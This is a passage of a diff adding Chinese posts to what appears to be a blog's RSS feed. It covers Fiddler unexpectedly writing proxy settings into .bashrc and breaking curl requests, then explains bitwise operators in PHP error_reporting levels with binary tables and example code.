style=&#34;color:#f92672&#34;&gt;/.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bashrc&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;.bashrc&lt;/code&gt;文件的修改时间正是打开&lt;code&gt;Fiddler&lt;/code&gt;的时间，于是删除最后四行重新启动&lt;code&gt;Fiddler&lt;/code&gt;发现&lt;code&gt;.bashrc&lt;/code&gt;文件又被写入了。&lt;/p&gt;
+&lt;p&gt;暂时还不清楚的是&lt;code&gt;Fiddler&lt;/code&gt;是如何更改系统网络配置的，而且这种更改发生后，如果终止&lt;code&gt;Fiddler&lt;/code&gt;进程，即相应的代理服务器被终止之后，所有的&lt;code&gt;http(s)&lt;/code&gt;请求都会因此失败，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;curl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;://&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;baidu&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;com&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;curl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Failed&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8888&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Connection&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;refused&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看网络代理配置，依旧是被修改后的样子&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://wx2.sinaimg.cn/mw1024/005XBvc9gy1g3ewalurrwj30ra0js76q.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;只好删除&lt;code&gt;.bashrc&lt;/code&gt;写入的配置，手动改回网络代理配置。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>位运算在PHP错误级别中的运用</title>
+      <link>https://username.github.io/%E4%BD%8D%E8%BF%90%E7%AE%97%E5%9C%A8php%E9%94%99%E8%AF%AF%E7%BA%A7%E5%88%AB%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/</link>
+      <pubDate>Sat, 08 Jun 2019 21:54:53 +0800</pubDate>
+      <guid>https://username.github.io/%E4%BD%8D%E8%BF%90%E7%AE%97%E5%9C%A8php%E9%94%99%E8%AF%AF%E7%BA%A7%E5%88%AB%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/</guid>
+      <description>&lt;p&gt;首先，我们要解决的第一个问题是&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;什么是位运算？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;按照&lt;a href=&#34;https://en.wikipedia.org/wiki/Bitwise_operation&#34;&gt;wikipedia&lt;/a&gt;中的说法，位运算有如下的含义&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;位运算操作的是二进制数&lt;/li&gt;
+&lt;li&gt;对二进制数在位级别上进行运算&lt;/li&gt;
+&lt;li&gt;效率通常比普通的加减乘除快（为什么快的问题有待解决）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其次，我们要解决的问题是&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;什么是PHP的错误级别？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;根据错误产生的原因，PHP将错误分成若干类，参见&lt;a href=&#34;http://php.net/manual/zh/errorfunc.constants.php&#34;&gt;文档&lt;/a&gt;。每一种错误对应一个全局常量，可以用来组合，得到的结果作为参数传递给&lt;code&gt;error_reporting()&lt;/code&gt;函数，PHP就能知道哪些错误应该被忽略，哪些错误应该被显示或记录日志。接下来，又引出一个问题&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;表示每一种错误的全局常量是如何被组合的？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在配置文件中的配置项&lt;code&gt;error_reporting&lt;/code&gt;或者传递给&lt;code&gt;error_reporting()&lt;/code&gt;的参数中，通过对表示错误的常量进行&lt;code&gt;位运算&lt;/code&gt;来组合错误种类，从而决定要处理哪些错误。&lt;/p&gt;
+&lt;p&gt;假定有符号整型在机器上占4个字节，32位。我们先看看表示错误的全局常量和其对应值的十进制与二进制表示&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;常量&lt;/th&gt;
+&lt;th&gt;十进制&lt;/th&gt;
+&lt;th&gt;二进制&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_ERROR&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00000001&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_WARNING&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00000010&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_PARSE&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00000100&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_NOTICE&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;8&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00001000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_CORE_ERROR&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;16&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00010000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_CORE_WARNING&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;32&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 00100000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_COMPILE_ERROR&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;64&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 01000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_COMPILE_WARNING&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000000 10000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_USER_ERROR&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;256&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000001 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_USER_WARNING&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;512&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000010 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_USER_NOTICE&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;1024&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00000100 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_STRICT&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;2048&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00001000 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_RECOVERABLE_ERROR&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;4096&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00010000 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_DEPRECATED&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;8192&lt;/td&gt;
+&lt;td&gt;00000000 00000000 00100000 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_USER_DEPRECATED&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;16384&lt;/td&gt;
+&lt;td&gt;00000000 00000000 01000000 00000000&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;E_ALL&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;32767&lt;/td&gt;
+&lt;td&gt;00000000 00000000 01111111 11111111&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;知道了要通过位运算组合错误种类，接下来的问题便是&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如何通过位运算来组合出我们想要的错误种类？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;首先，我们看看位运算符有哪些，参见&lt;a href=&#34;http://php.net/manual/zh/language.operators.bitwise.php&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;例子&lt;/th&gt;
+&lt;th&gt;名称&lt;/th&gt;
+&lt;th&gt;结果&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;$a &amp;amp; $b&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;And（按位与）&lt;/td&gt;
+&lt;td&gt;将把 $a 和 $b 中都为 1 的位设为 1。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;$a | $b&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Or（按位或）&lt;/td&gt;
+&lt;td&gt;将把 $a 和 $b 中任何一个为 1 的位设为 1。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;$a ^ $b&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Xor（按位异或）&lt;/td&gt;
+&lt;td&gt;将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;~ $a&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Not（按位取反）&lt;/td&gt;
+&lt;td&gt;将 $a 中为 0 的位设为 1，反之亦然。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;$a &amp;laquo; $b&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Shift left（左移）&lt;/td&gt;
+&lt;td&gt;将 $a 中的位向左移动 $b 次（每一次移动都表示“乘以 2”）。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;$a &amp;raquo; $b&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Shift right（右移）&lt;/td&gt;
+&lt;td&gt;将 $a 中的位向右移动 $b 次（每一次移动都表示“除以 2”）。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;利用这些运算符和预定义常量，就能对错误种类进行组合。假如，我们希望处理以下几种错误组合&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;所有错误都&lt;strong&gt;不&lt;/strong&gt;处理&lt;/li&gt;
+&lt;li&gt;处理&lt;code&gt;E_ALL&lt;/code&gt; 中除了&lt;code&gt;E_NOTICE&lt;/code&gt;类型错误&lt;/li&gt;
+&lt;li&gt;只处理&lt;code&gt;E_ERROR&lt;/code&gt;和&lt;code&gt;E_WARNING&lt;/code&gt;类型错误&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;第一个，显然要对&lt;code&gt;E_ALL&lt;/code&gt;取反，即&lt;code&gt;~E_ALL&lt;/code&gt;，二进制值运算式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11111111&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;11111111 11111111 10000000 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所有类型错误对应的位均被置0，表示所有错误将不会被显示。&lt;/p&gt;
+&lt;p&gt;例程如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;ini_set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;display_errors&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;E_ALL&lt;/span&gt;);
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_NOTICE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $var;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_USER_DEPRECATED
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;trigger_error&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;deprecated error triggered&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;E_USER_DEPRECATED&lt;/span&gt;);
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_WARNING
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_ERROR
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;();
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行，没有任何输出。&lt;/p&gt;
+&lt;p&gt;第二个，转换成位运算表示为&lt;code&gt;E_ALL &amp;amp; ~E_NOTICE&lt;/code&gt;，对应的二进制运算式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11111111&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11110111&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果为&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01111111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11110111&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除了&lt;code&gt;E_NOTICE&lt;/code&gt;对应的位为0，其他类型错误对应的位均为1，表示只有&lt;code&gt;E_NOTICE&lt;/code&gt;不会被显示。&lt;/p&gt;
+&lt;p&gt;例程如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;ini_set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;display_errors&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;E_ALL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;E_NOTICE&lt;/span&gt;);
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_NOTICE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $var;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_USER_DEPRECATED
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;trigger_error&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;deprecated error triggered&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;E_USER_DEPRECATED&lt;/span&gt;);
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_WARNING
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// E_ERROR
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;();
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行，输出&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Deprecated&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;deprecated&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;triggered&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;Warning&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Division&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zero&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Uncaught&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Call&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;undefined&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;() &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除了&lt;code&gt;E_NOTICE&lt;/code&gt;级别的错误，&lt;code&gt;E_WARNING&lt;/code&gt;、&lt;code&gt;E_ERROR&lt;/code&gt;和&lt;code&gt;E_USER_DEPRECATED&lt;/code&gt;级别的错误均被显示。&lt;/p&gt;
+&lt;p&gt;第三个，转换成位运算表示为&lt;code&gt;E_ERROR | E_WARNING&lt;/code&gt;，对应的二进制运算式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000001&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000010&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果为&lt;/p&gt;
